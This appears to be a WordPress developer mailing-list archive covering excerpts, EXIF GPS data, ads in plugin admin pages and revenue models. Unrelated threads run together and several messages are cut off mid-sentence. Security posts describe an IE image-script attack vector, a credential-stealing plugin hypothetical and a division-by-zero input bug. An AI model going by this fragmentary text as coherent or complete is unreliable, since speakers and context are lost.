"Summary" makes more sense to me than "Excerpt" for something this user explicitly enters.

"Teaser" would also work for me, but implies some intent that might not be appropriate.

3 of the 4 points are about the *auto*generated excerpt (which is
indeed an excerpt in the common sense of the word), not about the
manual excerpt (which is not an excerpt in the common sense of the
word).

The manual excerpt:

1.  Does NOT have a length limit.
2.  DOES retain HTML formatting.
3.  Does NOT have an ellipsis or a link at the end.

For illustration, I just made a dummy short post with a long manual
excerpt.  See how the *manual* excerpt appears in the monthly
archives:

http://op109.net/date/2009/03

(But you won?t get this result with many themes.  The themes that
utilize manual excerpts fully and properly are few.)

This looks interesting.

Is this a standard way of expressing the GPS info in exif or is it  
camera/gps specific?

Please raise a ticket on trac [1] and attach a patch.

This is in general available at present by unhooking filters and  
replacing wp_trim_excerpt.

It could be improved if the_excerpt took some arguments and I am sure  
a patch that improved this would get favourable attention ;-)

This isn't the sort of thing that merits a core option - this is all  
about how you write a theme and whether or not you are creating a  
specific theme or a generic theme.

If this option was to exist it would be part of a themes options page.

I don't think there is a strong need to change the name - and it is a  
term that is common across most blogging software with the same meaning.

It seems to be standard, I'll dive into the docs tonight to find the  
official URL for it.

Seems like this complies with http://www.exif.org/Exif2-2.PDF page  
#46, so it indeed follows the standard :)

Hey,

In my ever ongoing quest to find a way to make some money with all my  
plugins while still keeping them under the GPL and not charge for  
them, I was wondering how the "community" (as in you hackers and the  
ppl from Automattic) would react to advertising on plugins settings  
pages. I'm talking about adding one 125x125 ad spot to the top right  
of my plugins settings pages. Any thoughts?

Joost,
I personally have no problem with it. I ran a similar idea (for themes) by
Matt, and he seemed to approve. I assume the same would be true for plugins.

However, like all advertising, it has the potential to get out of hand,
loading the plugin/theme directory with flashy, ad-filled, fluff plugins
that were developed for the sole purpose of revenue.  At that point, they
will probably have to lower the hammer and remove all plugins/themes with
ads.

If the community can learn to self regulate, these kinds of problems can be
avoided.  But if not, the whole class will be punished (to reference a
common metaphor).

I would guess that you'll get a lot of push-back regardless of how  
reasonable a goal that you have in mind.

The perception will be that you added advertising to a page on "my"  
site. (Never mind the presumed security risk of you choosing to insert  
third-party code when I am logged in.) I may very well trust (as in  
trust but verify) your code, but now I have to trust your judgement in  
who you choose to distribute and who they choose to distribute, etc.

I can see how you would like to make a bit more money using advertising
but I have to agree with Tom Ransom as well
<quote>The perception will be that you added advertising to a page on
"my" site. (Never mind the presumed security risk of you choosing to
insert third-party code when I am logged in.)</qoute>

My other thought is if it's worth the effort and possible backlash
(a.k.a people uninstalling your plugin) for adding the advertisement
compared to the amount you will make on the advertisement.

You have to ask yourself how many times will the advertisement been
seen. How many times do you change settings for a given plugin?
What will the CTR be?

Dynamic advertising on a page within the admin sounds like a bad idea,  
you are injecting html/javascript from a third party into the trusted  
area of the system.

Better to just write something nice about donations and make it easy  
for people to donate - and give them the opportunity to make there  
donation public (e.g. a thank you section on the home page for your  
plugin)

Done all that, the results are too meager, even though I'm supposedly

So you know how whatever you enter in the post body is rendered by the
template tag "the_content", right?

How can I create multiple post bodies each with their own custom
template tag?  Is there a plugin for this?

I know I could probably do this with custom fields, but I want
something "beefier" than custom fields... with a bigger textarea that
has a RTE.  Thoughts?

Although I'm not sure I'd want to see ads in the admin console because its a potential slippery slope, I wonder why it would require "injecting html/javascript from a third party?"  It seems that it could work like this:

1.) A scheduled event in the plugin checks a web service on the plugin author's site for a new ad image.
2.) If found the scheduled event downloads the new ad image to a local directory.
3.) The ad image is displayed from the same domain as the site with a simple hyperlink.
4.) When the ad is clicked it routes thru a click tracker on the plugin author's site and then on to the advertiser's site.

How does that create an issue with a trusted area of the system?

P.S. I think Joost is asking a broader question: Have can a plugin author generate a revenue stream to support his efforts that doesn't require him or her to constantly do client-focused consulting and instead better target the needs of the general plugin user?  If we could come up with a community-acceptable way that can generate real income for plugin developers w/o retarding the open-source aspects that make the WP community so vibrant and valuable, this could benefit most on the hacker's list, no?

In a post's category you use the loop to display the post data.  Can
the same be done for a page?  I want to display page data in the
page's parent page (essentially... categorizing pages).

That's not how all ads work ... the original point/concern is very
valid.  While your solution would largely lay it to rest, the
potential problem is still there.

Yes, you are right ads can have many permutations, not there's no reason that Joost's or those deemed "okay" by the community would need to have those problem.  That objection is much like saying "Some people drive cars recklessly so let's ban all cars."

That said, I'm lukewarm on the idea but feel it does a disservice to the debate to use assumptions that aren't necessarily valid.

Right, because that is EXACTLY what I was saying.  I also think butter
knives should be dumped into the sea since they could be used to stab
someone.  I don't care if you like butter in your mashed potatoes.

Let's not go there, it does nothing for the conversation and is a
silly counter argument. Concern over scripts being inserted into the
users admin area are entirely valid in my opinion, no "not
necessarily" about it.

I don't get you point but agree, let's not go there (including calling the other's comments "silly.")

What "script" are you talking about?  My description of implemention had no scripts involved  (i.e. no client-side/javascripts).

Or do you mean the PHP file that implements the plugin is a script?  And if yes then how is that different from any other PHP in a plugin that implements admin console functionality?

Why would the ad have to be dynamic? plugins get the auto-update now, so if
you ever wanted to change the ad, just change it.  I don't see any harm in
that.

However, if we start talking about dynamic includes and javascript, then
that would worry me, to an extent, only because if the author's ad server
gets hacked, there's no telling what the hacker could do with that
capability at their fingertips.

Hi Bryan

I've built something for my own purposes that called aDirectoryManager 
that does something similar to what you describe. Basically a customised 
data capturing form, and ability for admin to difine variables to be 
populated with e.g. RTE, drop downs, checkboxes etc. depending on type 
of date, and design a export 'post-template' vor each 'directory' using 
a normal WordPress post and the default editor and placing placeholders 
like %description% in the body of the post which get replaced with the 
entered data (started on this thing before shortcodes) though a 'export' 
process. So you capture discrete structured data but you end up with 
that as well as 'baked' posts. Some of the reasons I did it this way 
included things like some data types automatically bcome tags as well as 
apearing in the body of the posts, automatically assign category based 
on the directory, force specific parameters for resizing and placing 
images in final posts etc. Basically to be able to build extensive 
directories using WordPress and users/datacaturers with limited or no 
blogging or computer literacy and understanding for the subtleties of 
formatting, lay-out etc. with just a few simple recipy style instructions.

This approach has both pros and cons, the plugin is still rather rough 
around the edges, and development is very slow and sporadic, but it is 
working well for me on a couple of sites.

I don't know how soon I'll get round to polishing it but you're more 
than welcome to give it a spin if you like, let me know.

Kind Regard

Here's another option: Have the community set up http://adserver.wordpress.org and have it serve ads for people who follow community guidelines.  There, no "untrusted 3rd parties."

However the real question is: "How can Joost (and others) make some reasonable income off their plugin development efforts" and throwing out the objection "It's a security problem" when it need not be is a red herring.

As a WordPress blog admin, I probably wouldn't mind this and probably
have the CSS / JS / PHP skill to remove it if I really needed to do
so. If I don't want it and can't remove it myself, I can probably send
you an email, pay someone $25 bucks to remove it, or find another
plugin.

As a WordPress plugin developer, I have considered this before and
would most likely implement it on a per plugin basis after it reaches
enough downloads to warrant approaching and advertiser. At this point
I would probably approach a specific advertiser with an intended
audience that meshes well with my plugin. One interesting way to pull
this off might be to have those advertisers "fund" a specific release
/ feature set for your plugin. You could even map out your projected
development / release dates for the next year and bounty for them off
via advertising. eg: Company A is funding the development for version
1.5 which will contain the following features and be the current
release for 3 months. As a result, their ad is displayed for this
period. After that, Company B is funding the development for version
2.0... etc.

That javascripts potentially injected into backend pages can't directly 
communicate to an other host than the admin is running because of "same 
origin policy".
They will at least need to be inside an iframe (as known as from googles 
adsence program) or be able to call the WordPress plugin itself as 
proxy, which is rounting the calls to the intended origin and returns 
back the answers.
In such cases (proxy behavoir) this plugin and also the transmitted 
ad-ware can spoof this interface (if it can be studied as source level) 
and drop any PHP code or prepared images with inplace script code that 
IE runs as example.
Futhermore any call to third party transmits automatical IP, hostname 
and if coded much more data out of the blogs domain and could also be 
used to transfer much more confidential data as expected.
You will run into the fact that developers will disassemble the entire 
plugin code to be sure, nothing unwanted will be transmitted. Such time 
wasting effort would force me to drop such a plugin and search for an
ad free solution or to rewrite it without ads.
As 2nd point, some Blogs are configured to deny any outside access from 
backend (blocked by provider or for own security reason) and this may 
lead to request delays and time gaps while 3rd party is unreachable.
And also keep in mind, if something of this interface can be abused, you 
would get at lot of flame articles on the web, that you are the reason 
for blog intrusions.

I will not condemn any ads needed to earn so money for free plugin work, 
but i think it's not worth to place it at backend pages.

Mike raises an important question which I think more sums up what  
Joost wants to know:

"How can a plugin author generate a revenue stream to support his  
efforts that doesn't require him or her to constantly do client- 
focused consulting and instead better target the needs of the general  
plugin user?  If we could come up with a community-acceptable way that  
can generate real income for plugin developers w/o retarding the open- 
source aspects that make the WP community so vibrant and valuable,  
this could benefit most on the hacker's list, no?"

I agree answering this question definitely sounds like a good idea.

In general I think that if you want to make money from open source  
programming in general then you need to accept that the software that  
you write will directly generate very little revenue.

In simplistic terms,  a traditional business relies on the one-off  
revenue from sales to fund development and after-sales support.

On the other hand the open source software businesses model relies on  
giving away the software for free and charging for the after-sales  
support so that people only pay for the support they.

My personal opinions:

  1) Charge people for support - this is the one revenue stream that  
the open source model positively encourages.
  2) Take on paid consulting work for specific plugin development with  
a view to making the plugins written available to all - i.e get  
someone to pay for the work but release it to the community and make  
sure you promote the fact that they made it happen.
  3) Accept donations - This is never going to be guaranteed income -  
think of it more like a bonus scheme.

In short, if you want a continual revenue stream then you need direct  
clients.

The only way to avoid requiring direct clients is to work for a  
company which has them!

Peter,
It's not my intention to start a war here or anything, but I want to address
your 2nd point ... something that bothers me a good deal when it comes to
the "give it away, charge for support" model ...

In the "give it away, charge for support" model, if you write an easy to
use, user friendly program/plugin/theme, you're undercutting your own
profits.
Whereas when you charge for the product, and give the support away for free,
then you have a greater incentive to write easy to use code in the first
place.

It would seem that the best way to make the most money is to write a program
that is very useful and in high demand, but make sure that you don't make it
so easy to use that you end up making support unnecessary.  It's almost like
you have to purposefully inferior product in order to get a decent return.

Obviously, this doesn't hold true in your first and third points, nor does
it hold true in the service industry (like WP.com), but in your second
point, I believe this is that particular model's greatest weakness, and is
why it is difficult, if not nearly impossible, to make work. (there's a
reason why Revolution/SudioPress themes are no longer available for free)

You don't have to only support your own plugins/themes.

To turn you argument on it's head:

By writing easy to use, user friendly products (plugins/themes) you  
are saying to your potential customer here is a can do person who  
solves problems in a user friendly way and understands my needs.  This  
is the sort of person who will be able to solve my problem with that  
overly complicated / poorly written plugin/theme that I am having  
trouble getting working _or_ this is the person I want to employ to  
develop my new high revenue site.

If you can show that you are capable, people will be willing to pay  
for your services.

In my personal opinion:

If you want to make money in the open-source world then you need to  
think of the code you give away for free, and the community  
interaction you make as an on-going job interview.

Show your potential customers the benefits you can give them.

Those who have asked me for this have all been using different themes and
each of them wanted the ability to include the_excerpt, or not, on a
post-by-post basis. It's easy enough to do globally with a theme and can
also be done by using the <!--more--> tag. But the point they raised when I
suggested this was that it's a feature of other web apps so they had
expected similar functionality from WordPress.

I don't use this myself but its come up often enough to be interesting.
Nobody has taken up my suggestion yet to add this to the ideas forum though
;)

Peter, I hear ya ...
... but you do at least admit that supporting your own products is a losing
game if you make good products, and you have to resort to supporting other
people's code, and/or selling your coding services.

ANY plugin could do something unsavory. All the things you mention could be done by a plugin that is not advertising-related, and also a plugin that is advertising-related could avoid all those things so as to be a good citizen. Do you code review every plugin you use (which is probably a good idea, but tangential to the discussion?)  How does this make plugins that serve advertising different?

Mike makes a good point.  I could write a plugin that, when activated on a
user blog, emails me the URL, admin credentials, etc., and kablam, I can do
all sorts of bad things.  I could also bury it deep inside a class to make
it invisible to the average user.

Fact is, plugins are dangerous things. Having ads in them doesn't make the
situation any worse.

How about releasing a product freely under GPL, then developing add-ons and
additional features that are complimentary to it and releasing them under a
proprietary license?

The core is free, but pay for the extras.  Kind of a 'half-free' system.

The main difference is, that normal plugins won't load code, images or 
something else from 3rd party servers.
And yes, i review each plugin and theme i plan to use.

Sure, every plugin can do "bad" things, but if i have a plugin in test, 
that prominent shows me loaded 3rd party things, i will first of all 
deactivate it and inspect it more carefully as i would do with others.
Also i have a service plugin running which scanns each other plugins php 
pages for unknown fopen, fetch_rss and many more remote call funtions 
reported at dashboard, if unknown.

Normally no plugin needs 3rd party server calls (except those intended 
to work so like akismet, content importer or known defined things).
I don't expect remote calls in plugins like smiley replacer but you want 
introduce 3rd party calls for this too.

And if the 3rd party server has been hacked, all plugin using domains 
will be virulent infected too. Also a DNS spoofing attack can route the 
advertising calls to an evil server and serves now real "bullshit".
This is not longer under control of blog admins and what you think will 
happen, if your plugin is the source of lost revenues of high traffic 
installations by attacks ? What you think, their lawyer will do ?

I concur with Nathan and add a few comments.  

-- "Charging for support" requires a significant number of users to be economically viable and the best developers don't often make good support techs. It's very hard to do both well.  Also, how does the one-man shop who charges for support ever go on vacation?

-- "Paid consulting work for plugin development" also has real shortcomings. If someone gets paid to develop then they are disincented to release things to the community that someone else might want to pay for.  Also the clients drive specific functionality and care not about the value of a general purpose plugin with nice admin functionality for configuration.

-- "Donations" based on users thinking its a good idea can buy beer, but little else.

Here are a couple of thoughts I've had on the subject. In my past I've built and run a company that was successful for well over 6 years that is similar to the consortium idea.

1.) Implement functionality in core that encourages donations and streamlines the process for users making donations. I know in the past when an open-source product I've downloaded has solicited me from within their software to make a reasonable donation and made it as easy as clicking a button or two I've gone ahead and given money. When it is something I need to search out how and where to give of my own initiative, I never seem to get around to it.

This could be accomplished by adding fields into the plugin description header for a payment account and a recommended donation amount, i.e.

/*
Plugin Name: My Awesome Plugin
Plugin URI: http://example.com/wordpress-plugins/my-awesome-plugin
Description: An Awesome Plugin that everyone should use
Version: 1.0
Author: Joe Plugin Developer
Author URI: http://example.com
Donations To: paypal/joe@example.com
Suggested Donation: US$5.00
*/

When the plugin is activated WordPress could suggest they send a donation and launch the process if the user agrees. I used PayPal as the example here but only as a first donation service provider because of it's ubiquity; more could be added over time.

Further, each time an admin page is visited for the plugin the same suggestion could be displayed with an option for the user to select "Don't show me this again for this plugin."  

If this became super easy I bet a lot of plugin developers would start getting more donations than they currently get.

2.) On the plugin screen add in core a "Suggest Feature" link for each plugin. When a user clicks that link it could display a suggestion form along with a few fields where they could offer to pay a bounty including dollar amount and when they'd need it by. This would trigger an email to a hypothetical new "Suggestions To:" email address in the header, and later if could also post that information into a database at WordPress.org to aggregate the suggestions and allow people to agree to collectively contribute to the bounties.

3.) Develop a consortium of plugin developers that offer support contracts to WordPress users. One of the keys of support is to provide users with a defined set of "approved" plugins that will be maintained by the consortium with urgency when the new versions of WordPress are released. Clearly a distinction would need to be made for the benefit of paying users and ones who don't pay. I've actually run a business than in many ways was similar to this. Organizing something like this might really interest me.

I'm sure there are other ways but I figured this could start the discussion.

Peter,
It's not my intention to start a war here or anything, but I want to address
your 2nd point ... something that bothers me a good deal when it comes to
the "give it away, charge for support" model ...

In the "give it away, charge for support" model, if you write an easy to
use, user friendly program/plugin/theme, you're undercutting your own
profits.
Whereas when you charge for the product, and give the support away for free,
then you have a greater incentive to write easy to use code in the first
place.

It would seem that the best way to make the most money is to write a program
that is very useful and in high demand, but make sure that you don't make it
so easy to use that you end up making support unnecessary.  It's almost like
you have to purposefully inferior product in order to get a decent return.

Obviously, this doesn't hold true in your first and third points, nor does
it hold true in the service industry (like WP.com), but in your second
point, I believe this is that particular model's greatest weakness, and is
why it is difficult, if not nearly impossible, to make work. (there's a
reason why Revolution/SudioPress themes are no longer available for free)

So would you see a hard-coded .JPG ad including with a plugin as a problem? Joost could do that and I don't see any way it would be a security problem.

Also, is contacting 3rd party servers a problem?  Does that mean that plugins that contact Twitter or Flickr are a problem (probably not, those are well known services.) But what about a less-well known service? Where does it become "no longer okay?"  To me, it's when the 3rd party server have bad intentions, not the fact it is a 3rd party server.

> Normally no plugin needs 3rd party server calls 

Maybe in the past, but as the web evolves there will be more and more demand for this as the value of interacting with 3rd party web services grow. 

> And if the 3rd party server has been hacked, all plugin using domains 
will be virulent infected too. 

Not necessarily.  It all depends on what that plugin does when it contacts the 3rd party server. If all it ever does is download a JPG, please tell me how that can be a problem (besides presenting a porn ad, LOL!) 

Not all circumstances are created equal.

> Also a DNS spoofing attack can route the advertising calls to an evil server and serves now real "bullshit".

And a DNS spooking attack and also serve someone else's website. You are presenting unlikely hypotheticals that require many other things to be wrong too.

You are making a lot of assumptions that the plugin author will do lot of things very wrong. Just as with SQL injection attacks, there are best practices to follow to avoid the problems.

All I'm saying is let's not throw the baby out with the bathwater.

I like the idea, it's essentially the "FREEmium" model (http://en.wikipedia.org/wiki/Freemium), but I think the GPL proponents might say that would violate the GPL? Not being a lawyer, I can't make that call but it does pose the question: if a FREEmium model acceptable to the community?

So let me reference a german IT magazin. They have also a security 
related section and this is a link to an acticle out of: 
http://www.heise.de/security/Risiko-durch-MIME-Sniffing-im-Internet-Explorer--/artikel/122187
english translated Subject: MIME Sniffing at IE Image Content and 
execution of embedded javascripts!
At the end of article you will find 3 links with prepared demo images 
that execute javascript code embedded into images if viewed by Internet 
Explorer.
If such a script out of the image will be executed in backend of 
WordPress, it can use the already loaded jQuery and infrastructure to 
modify a lot of page content inside the database using ajax interface or 
xmlrpc by javascript driven ajax posts. So an image is enough to 
compromize the blog, serving frontend pages with hacked content and 
viagra links amd much more.

This is an easy attack vector if you remember, that Microsoft browser is 
the most used browser and doesn't get fixed at all. Companies sometimes 
are foced to use IE6 because their applications won't run any longer at 
higher versions.
With this short and easy scenario shown it is not so easy to state "hey, 
what can an image do for damage ?".

Hi,

It's been a nice lively discussion. I guess we don't need to be reminded 
about the entire sponsored themes issue that cropped up about a year or 
so back. When they were allowed to thrive, they were soon misused and 
even today there are a lot of them released and used by unsuspecting users.

Because of these, the entire theme validation process on WP Extend has 
become a several day issue, simply because every line of code needs to 
be checked to ensure it fits all the guidelines.

Aren't we inviting the same problem by enabling ads in themes. I'm sure 
a majority of us plugin developers would definitely stick to the 
guidelines and definitely not to anything to compromise the security of 
blogs of our users.

However, what's stopping others from releasing plugins only for the sake 
of displaying ads? The policing of the WP Plugins Repository would begin 
on a much larger aspect and today's updates which take 15 minutes will 
become a few day process. And if these are urgent security related 
updates.... well, you're putting a lot of blogs at risk.



Regards,
Ajay D'Souza

Yeah, but there's an easy fix for this given the proposed implementation for this use-case:

   $image = imagecreatefromjpeg('suspect_file.jpg');
   @imagejpeg($image,'safe_file.jpg',100);
   unlink('suspect_file.jpg');

If it is a "bad" file, you'll just get a black image.

Subject: Re: [wp-hackers] Advertising on plugin pages

So let me reference a german IT magazin. They have also a security 
related section and this is a link to an acticle out of: 
http://www.heise.de/security/Risiko-durch-MIME-Sniffing-im-Internet-Explorer--/artikel/122187
english translated Subject: MIME Sniffing at IE Image Content and 
execution of embedded javascripts!
At the end of article you will find 3 links with prepared demo images 
that execute javascript code embedded into images if viewed by Internet 
Explorer.
If such a script out of the image will be executed in backend of 
WordPress, it can use the already loaded jQuery and infrastructure to 
modify a lot of page content inside the database using ajax interface or 
xmlrpc by javascript driven ajax posts. So an image is enough to 
compromize the blog, serving frontend pages with hacked content and 
viagra links amd much more.

This is an easy attack vector if you remember, that Microsoft browser is 
the most used browser and doesn't get fixed at all. Companies sometimes 
are foced to use IE6 because their applications won't run any longer at 
higher versions.
With this short and easy scenario shown it is not so easy to state "hey, 
what can an image do for damage ?".

I know that. But it's the same problem autoupdate of WordPress have had 
this times:
 - the images written by the script running user which is not the FTP 
user but wwwrun (server) gets the wrong ownership and rights.
Afterwards you can't access the image nor delete it using FTP clients.
It may solve the scriptcode issue but won't work, if you dont write the 
image using appropriated FTP user (FTP classes) to the domains space.
Many providers running scripts not at context of FTP user, so you have 
to deal with this too.

The most important thing is security of blogs. All what have been 
written to this ads subject is highly security critical.
I want to have a secure environment and i don't see, how this can be 
permitted easy if plugins massively starting to load secondary content 
from elsewhere.
The advertising itself is not the main problem, security and reliability 
are the things to be keeped always.
So if you state at you plugins download agreement, that any spam and/or 
intrusion damage forcing a profit loss to me, verifiably logged to your 
plugin as source, will be incured by your service company, i would 
install it.
I think, without any "trust center" and verified ads provider this is 
not a good idea.

To me, it's when the client doesn't sanity-check the data retrieved  
from the 3rd party server, and (un)intentionally executes/includes/ 
injects it somewhere unpleasant. Using content from 3rd parties is not  
bad, trusting that content without verification is.

I agree with Heiko on this. However, there may be another way of helping
plugin developers (and theme developers) whose work is accepted onto
wordpress.org. If each plugin page had a donation button and link to show
appreciation this would be seen by the community at the time they download.

I have no problem with a donation link being on each plugin (or theme) page
but wordpress.org would have to agree to it of course.

Perhaps even two buttons? 1. "Liking WordPress - donate" and "Support the
development of this plugin - donate".

Just a thought...

May be, that this is not the only fix needed:

refere to wp_exif_frac2dec() function and potential manipulated image data:

function wp_exif_frac2dec($str) {
    @list( $n, $d ) = explode( '/', $str );
    if ( !empty($d) )
        return $n / $d;
    return $str;
}

The empty() test may cover the division by zero too but not if i try 
following string:  "5/-0.0"
The test code (same result at function with this input):

<?php
        $c = "5";
        $d = "-0.0";
        echo empty($d) ? "yes" : "no";
        echo '<br/>';
        echo $c / $d;
        echo '<br/>';
    ?>
and the result of:

no
*Warning*: Division by zero in 
*C:\xampp\_root_wordpress-offline\wp-content\themes\classic\index.php* 
on line *77*

I think, an appropriated cast to (float) is nessesary to detect such 
string manipulations at wp core dealing with image data.
May be some more functions been affected.

I would personally use WPMU, it's a much more manageable solution, and
considering he will want to be able to post to all seven, probably the
easiest too.

This is a shameless plug for my product, but might I suggest you check out
WP Hive (http://wp-hive.com)?

It allows an administrator to run multiple sites from a single instance of
WordPress, without the WPMU complexity.

Adding a donate link to your plugins page on wordpress.org is already  
possible. This is one of the things that can be added to the readme.txt.

Check the developer info on wordpress.org and the readme validator for  
more info.

Didn't edit existing wp_exif_frac2dec() but also think it is necessary to
fix that part.
My part of the code also need some additional float checks.

wp_exif_frac2dec() is one of the reasons why I opened discussion here and
not just a ticket.

Personally, I wouldn't mind as long as they were unobtrusive and deemed
'safe' by some form of peer review. If either of those were not met, I'm
certain someone will re-release your plugin after removing the
annoying/offending content, and people will just fetch that version instead.

I've just bought a netbook with my donations - and not the smallest or

already available for plugins, though I'd add my vote to it being made
available for theme developers as well.

yuck - suggested amounts will deter more people if they are pitched
too high, and if pitched to low would restrict your income. Much
better to allow people to specify what they want to give.

another yuck. If plugins did this for me I'd probably delete them and
go find another. A simple donation link within a plugin page on the
other hand is fine.

I also don't like the idea of third party adverts in the admin side -
to me that has moved away from GPL, and towards 'ad supported'. I
don't install ad supported software locally, why should I use it in
the back end of WordPress?


> 2.) On the plugin screen add in core a "Suggest Feature"

set up your own forum, and use that - much much easier. Point people
at that instead. they also get to see the support you do give, when
given freely anyway.

I'm managing about 10 wp-installations. At one point I got tired of

(ruby build language) to do it for me. It's worked kind of all
right. But now it's getting big and hairy, as more and more

A) Clean it up and get a bit serious about it. 

or

Needless to say I'd rather go with B. Any takers?

Notwithstanding technical and security issues that may exist...

 From a developer POV I think it's a fine idea.  From a user  
perspective I think you're going to have users who are angry that  
you're putting ads in their admin.

Especially when you think of situations where somebody is hired to set  
up a site for a client.  If the dev uses your plugin, the client is  
going to come back to *that* person saying "Why the hell are you  
putting ads in the admin?"

So...

Maybe you put ads in, but charge a small fee for a no-ads version.

That would require changes to the auto-update system, though, as you  
wouldn't want the no-ad version auto-updating to the ad version.

I assume you are using Subversion. I thought about doing something 
similar. The issue is more switching to the latest stable. I thought 
about using a shell script with the locations of all of the WordPress 
locations, since there will be around 10 locations as well and manually 
switching would be a waste of time.

Interesting. I forgot to say that theese sites are on different
webhosts/accounts, so Virtual Multiblog is probably not for me.

Why not just use the built-in auto-upgrade feature in 2.7?

I've got eight WordPress installs scattered over different 
accounts/servers. When 2.7.1 came out, it took me about 15 minutes to 
update all of them using the auto-upgrade feature.

It's a wild mix of subversion, rsync, rake and ftp. A roll-it-yourself
deployment tool. Now I'm thinking of moving to a more mature
deployment tool, preferably something in python.

 I believe its possible to have some commercial success with gpl WP plugin
development. However its necessary to have a suite of plugins covering user
needs in a niche and adding real value to users. Free plugins, but with a
support membership, with a forum and tools to give even more value to
customers. It must be set up as a business and managed like a business, just
not some clever code released for free...  The key point will be the extra
value added in the support solution.

ad`s in plugins is not a great idea...

Not to overlook Joost's superior (to mine at least) marketing abilities, 
but it doesn't seem to me neither that a plugin admin page is a fine ad 
placement. Typically you load these pages once or a few times and then 
never see them. Who wants to buy an ad for this?

Or maybe I didn't get the scope of the question and it was to add an ad in 
every page of the admin area (like, in the top grey bar)? 

About paypal donations: the best implementation I've seen to date is in 
the XML Google sitemap plugin by Arne Brachold (definitely not sure about 
how it's spelt, sorry:) that displays a list of recent donators. On top of 
this if he would actually thank donators and maybe update the list, that 
would be perfect </grin>

No, the built-in auto-upgrade feature only upgrades the core WordPress 
files when you upgrade to the new version of WordPress.

The plugins can also be upgraded automatically, one at a time, whenever 
a new plugin version is released, but they aren't touched during a 
WordPress upgrade.

Saying it could only buy beer was a euphemism. The reality is your donation income isn't sufficient to support a plugin developer without alternate full-time income. US$1000 is peanuts, I make that in less than 2 days doing consulting. IOW, plugin development (currently) is at best a hobby, not a career unless it is done as a way to market consulting services which some people would prefer not to do (myself included, really.)

Where is said functionality?  I've never seen any requests for donations that operate in the manner I was suggesting.

I think setting a suggested amount would increase likelihood of donation but honestly I don't know statistically would which works best but I'll bet your don't either. My suggestion was just a starting point for discussion.

Then a global "don't show me plugin donation requests" would work for you.

FWIW, I lean towards no ads because it would probably lead to too much focus on ads and not enough on functionality but not because I have an ideology against ad-support. If you don't use something of value simply because it has ads it seems you are harming yourself more than anyone else.

This requires the user to proactively search for the forums and signup, which most won't ever do. 

Plus I personally find having hundreds of support forums mostly with little or no traffic to be a total pain in the rear as a user of plugins. I don't want to have hundreds of forum accounts and at hundreds of domains. YUCK.

Same here. I average about $150-200 a month I think. That's not a lot  
compared to the time I invest in it.

You're right in most cases. People don't know what to give and then  
just don't give. (though i should probably start trying this)

Exactly, and it was just a thought to start the discussion, which  
seemed to work ;)

Agreed, I've switched to the WP support forums for that same reason,  
but am now reconsidering, because my own forums would allow me to make  
some money there... Don't know whether there is really an improvement  
though.

In the end I develop plugins because I like doing it, but other  
communities seem to be a lot better in getting people to benefit from  
their plugin / extension work. I think the WordPress community would  
benefit if there were a system that would allow people to make a bit  
more money with all of this.

Best,
Joost

I think you have the germ of an idea there, not about ads but about the difference between Joe Blogger who sets up a blog to speak his mind and uses plugins to help, and Joe Web Dev who sets up WP sites for clients.  Joe Web Dev makes a living doing it and he or better yet his client's really should be supporting their plugin developers.

Is there a way to maintain the free-ness and avoid the ads, but make it much more likely that the commercial users of WordPress would send a reasonable donation to the developers, we might have something here. 

FWIW I suggested to my current client that they allocate some funds for donation (I am a sub to them) and they were annoyed with me for asking. That said I'll personally be making donations to those who built the plugins we ultimately used, but not as much as they should have.

I don't work, but yes if I was in the field of consulting I would
expect to earn in one day what has taken me several months via
donations. I don't need to rely on them, maybe I'm lucky in that

You can add a simple donation link to the readme and have it displayed
at WordPress.org

I see at as extremely unlikely that any other method will get into the core.

Hmm. Not necessarily - 'adware' has been known to be some what
suspicious - the suggestion of putting ads into the admin side is a
similar concept. The perceived nature will be that it is adware (even
in a different format).

yes and no - depends on ho much they value the plugin. Considering
those that are likely to post on WordPress forums asking for help with
a plugin is a very small percentage compared to the number of users
out there  I don't see it as a problem. Though the WP forums aren't
that user friendly, especially for plugin developers - it would be
nice to have control over the threads that are about my plugin so I
can mark them as resolved etc etc.

I have far more control of my own forum.

If you download software and need support you quite often join a forum
- so can end up on many without realising it.

I fully agree with Westi , let me add some personal experience :

my plugin NextGEN Gallery is by far not the best programmed plugin,
but during two years it raised up to one of the TOP 10 plugins, itS
written in a period where no gallery features are in WP core, so it's
maybe already useless cause the WP core gallery system is
getting better and better, but currently I still receive a lot of
feedback.

During this two years I earned more than $3000 donations (hard to
calculate cause I'm accepting Euro as well). If you donate, then you
can
choose the value you want and yes it's very often something between $5
- $20.

But the most donation are done from 10 companys, which donate some
money (> $100) and request special features, some of then are now core
features,
some of them are not released, cause their are not in my focus.

Support it done via the WP forums and I'm not accept any support
question by mail, so only donators and "customers" receive the support
via email.

Let me add : I've written this plugin for my own purpose, what I never
thought before is the buiness interest, I've received a lot of
requests
for other jobs and I feel if you are a real talent programmer, then
you can build more business around your plugins or you get maybe hired
by Automattic :-)

Fact is, you can earn money with plugin support & dev, of course it's
hard job to get a plugin up to the TOP 10, but I feel if it's a real
killer
plugin then you get after a time your feedback. There is no need to
use Ads, but it's also no shame to add a donate button inside your
plugin.

There is an existing trac ticket http://core.trac.wordpress.org/ticket/5353 
  to include the GPS information along with the other meta data being  
extracted. There are a couple good reference links in there too. That  
ticket was rejected at the time as plugin territory.

I would argue that it's time to reconsider as GPS in photos has become  
much more mainstream. There are now millions of iPhones, and a growing  
list of other devices, out there now embedding GPS meta data into  
photos. This functionality would be a perfect companion to the  
WordPress iPhone app and have many other uses as well.

Now as to what we do with the data after it's extracted and stored, I  
agree that is still best handled by themes and plugins.

First, let me thank you for NextGEN, I used it on my current project and it was very helpful and you'll be getting a donation from me. I'd showcase it but my client has asked that I not talk about how it was developed for fear of getting hacked. I do have an important patch to contribute but will do that offline.

That's great, and certainly better than not getting anything but US$1500/year isn't enough to live on. 

For 12 years I ran a reseller of developer tools for Visual Basic and we had hundreds of companies that sold developer products to Visual Basic & .NET developers. Companies, not just individuals. The obviously made enough money to live on, and both they and we learned that to be a great add-on developer is a much different business than to be a great consultant. So if the only viable model for WordPress plugin developers is as a lead-in to consulting then we'll by definition the community will get plugins that are less than they could be.

However, one of the reasons I left that business was because I came to believe strongly in open-source and fell open-source allows developers to decide how best to build software and not their managers who control the purse-strings.  Yes I'm a capitalist, but an idealistic one.

In summary, I think it would be great if we could develop a model that could allow plugin developers to work full-time on building great plugins. But that's all I'll say on the subject today. Since I posted yesterday I've come to realize this mailing list isn't the forum to make it happen so I'll incubate the ideas elsewhere for now.

It would be nice if there was a standard way of associating a geo
location to a WP post. I've seen several plugins, all of which use
different metadata names for this sort of thing. The most common one
I've seen is "_geo_location". Several different plugins use this, in
